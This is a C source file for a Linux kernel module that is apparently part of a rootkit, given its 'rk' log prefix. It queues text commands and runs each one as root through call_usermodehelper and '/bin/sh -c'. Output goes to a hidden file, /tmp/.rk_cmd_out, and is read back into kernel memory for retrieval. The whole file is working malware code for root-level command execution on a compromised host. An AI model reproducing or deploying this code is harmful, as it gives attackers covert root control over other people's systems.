// SPDX-License-Identifier: GPL-2.0
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/umh.h>

#include "cmds.h"

#define OUTPUT_FILE "/tmp/.rk_cmd_out"

static LIST_HEAD(cmd_list);

int cmds_add(const char *text)
{
	struct cmd_entry *e;

	e = kzalloc(sizeof(*e), GFP_KERNEL);
	if (!e)
		return -ENOMEM;
	strscpy(e->text, text, sizeof(e->text));
	list_add_tail(&e->node, &cmd_list);
	return 0;
}

static void exec_one(struct cmd_entry *e)
{
	char cmdline[128];
	char *argv[] = { "/bin/sh", "-c", cmdline, NULL };
	char *envp[] = { "PATH=/bin:/sbin:/usr/bin", NULL };
	struct file *f;
	loff_t pos = 0;
	int n;

	snprintf(cmdline, sizeof(cmdline), "%s > %s 2>&1", e->text, OUTPUT_FILE);
	e->result = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	e->executed = true;

	f = filp_open(OUTPUT_FILE, O_RDONLY, 0);
	if (!IS_ERR(f)) {
		n = kernel_read(f, e->output, sizeof(e->output) - 1, &pos);
		filp_close(f, NULL);
		if (n > 0) {
			e->output[n] = '\0';
			if (e->output[n - 1] == '\n')
				e->output[n - 1] = '\0';
		} else {
			e->output[0] = '\0';
		}
	}
}

void cmds_exec_all(void)
{
	struct cmd_entry *e;

	list_for_each_entry(e, &cmd_list, node) {
		if (!e->executed) {
			exec_one(e);
			pr_info("rk: exec '%s' -> %d\n", e->text, e->result);
		}
	}
}

void cmds_clear(void)
{
	struct cmd_entry *e, *tmp;

	list_for_each_entry_safe(e, tmp, &cmd_list, node) {
		list_del(&e->node);
		kfree(e);
	}
}

int cmds_format(char *buf, size_t size)
{
	struct cmd_entry *e;
	int len = 0;

	list_for_each_entry(e, &cmd_list, node) {
		if (e->executed) {
			len += snprintf(buf + len, size - len, "$ %s\n", e->text);
			if (e->output[0])
				len += snprintf(buf + len, size - len, "%s\n",
						e->output);
		} else {
			len += snprintf(buf + len, size - len, "[pending] %s\n",
					e->text);
		}
	}
	return len;
}
